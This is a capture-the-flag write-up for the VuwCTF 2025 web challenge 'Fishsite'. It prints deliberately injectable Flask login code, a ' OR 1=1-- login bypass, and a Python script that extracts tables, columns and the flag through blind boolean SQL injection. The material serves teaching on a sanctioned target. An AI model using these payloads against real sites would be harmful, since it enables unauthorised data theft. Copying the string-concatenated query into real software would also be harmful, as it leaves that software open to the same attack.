---
layout: post
title: "Fishsite"
categories: [web, VuwCTF2025]
date: 2025-12-6 90:00:00 -0500
writeup: true
permalink: /write-ups/fishsite/
order: 2
---

**VuwCTF 2025**

**Challenge:** Fishsite

**Category:** Web

**Flag:** ``VuwCTF{h3art_0v_p3ar1}``

I participated with my club team, tjcsc, in VuwCTF 2025, and we got 5th place!

Upon opening the site, you're presented with this login page:
![Initial challenge website](./fishlogin.png)

We are given fishsite.py:
----------------------------------------------------------
```
import os
import sqlite3
import flask

app = flask.Flask(__name__)

app.secret_key = os.urandom(32)

@app.route('/')
def index():
    return flask.render_template("index.html")

@app.post('/login')
def login():
    username = flask.request.form.get('username')
    password = flask.request.form.get('password')
    
    db = sqlite3.connect("file:db.db?mode=ro", uri=True)
    cur = db.cursor()
    cur.execute("SELECT COUNT(*) FROM fish WHERE username = '" + username + "' AND password ='" + password +"';")

    try:
        count = cur.fetchone()[0]
        if count > 0:
            flask.session["username"] = username
            
            cur.close()
            db.close()
            return flask.redirect('/admarine')
        else:
            cur.close()
            db.close()
            return flask.render_template("index.html", error="Incorrect password")
    except TypeError:
        cur.close()
        db.close()
        return flask.render_template("index.html", error="No user found")
    
@app.route('/admarine')
def admin():
    if 'username' not in flask.session:
        return flask.redirect('/')
    return flask.render_template("admin.html")

DISALLOWED_WORDS = ["insert", "create", "alter", "drop", "delete", "backup", "transaction", "commit", "rollback", "replace", "update", "pragma", "attach", "load", "vacuum"]

@app.post('/monitor')
def monitor():
    if 'username' not in flask.session:
        return flask.redirect('/')
    
    query = flask.request.form.get('query')
    
    for word in DISALLOWED_WORDS:
        if word in query.lower():
            return flask.redirect('/admarine')
    
    db = sqlite3.connect("file:db.db?mode=ro", uri=True)
    cur = db.cursor()
    try:
        cur.execute(query)
    except:
        cur.close()
        db.close()
        return flask.render_template('/admin.html', error="Invalid query")
    
    cur.close()
    db.close()
    return flask.render_template("/admin.html", error="Successful process")

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=9995)
```

----------------------------------------------------------

Firstly, there's a pretty obvious basic SQLi vulnerability right here:
``    cur.execute("SELECT COUNT(*) FROM fish WHERE username = '" + username + "' AND password ='" + password +"';") ``

Using quotation marks, we can escape the username field and modify the SQL query.
The condition 1=1 always evaluates to true, and we can use "--" to comment out the rest of the query.

So, inputting something like ``' OR 1=1--`` will result in the SQL query:
``SELECT COUNT(*) FROM fish where username = '' OR 1=1--" + username + "' AND password ='" + password +"';")``

This query will always evaluate to true, so inputting ``' OR 1=1--`` gets us through the login page.

Then, we're presented with an "administration pane:"
![Administration pane](./fishadmin.png)

We can see in ``fishsite.py`` that there is a list of disallowed words that we cannot use in our SQL injection:
``DISALLOWED_WORDS = ["insert", "create", "alter", "drop", "delete", "backup", "transaction", "commit", "rollback", "replace", "update", "pragma", "attach", "load", "vacuum"]``

Notably, this list does not disallow "SELECT."

Remember this input from earlier that gave us access to the administration pane?
``' OR 1=1--``

We can use this kind of query for binary search by just replacing 1=1 with a boolean we want to check.

In this case, we can binary search for characters in the list of tables, then the list of columns.

Recon code:
```
import requests

url = "https://fishsite-a32d72b4635a88d5.challenges.2025.vuwctf.com/"  # replace with your instance url

def check(condition):
    payload = f"' OR ({condition})--"
    r = requests.post(f"{url}/login", data={"username": payload, "password": "x"}, allow_redirects=False)
    return r.status_code == 302

def extract_string(query):
    result = ""
    for pos in range(1, 300):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            if check(f"UNICODE(SUBSTR(({query}),{pos},1)) > {mid}"):
                low = mid + 1
            else:
                high = mid - 1
        char_code = low
        if char_code <= 32 or char_code > 126:
            break
        result += chr(char_code)
        print(f"{result}")
    return result


tables = extract_string("SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' LIMIT 1")
print(f"\nTables: {tables}\n")

columns = extract_string(f"SELECT group_concat(name, ',') FROM pragma_table_info('{tables}')")
print(f"\nColumns in {tables}: {columns}\n")
```

After running this (and a lot of waiting for the searches to resolve) we get one table ``fish`` with columns ``id, username, password``.

...No obvious flag there.

Well, since it's a blind SQLi challenge, we can always try something obvious now that we've found the vulnerability:

```
flag = extract_string("SELECT * FROM flag LIMIT 1")
print(f"\nResult: {flag}\n")
```

<del>ohwaitit'sactuallyworking</del> I'll be darned, it actually worked.

After lots of waiting, the flag ```VuwCTF{h3art_0v_p3ar1}``` popped up in the output! Nice!
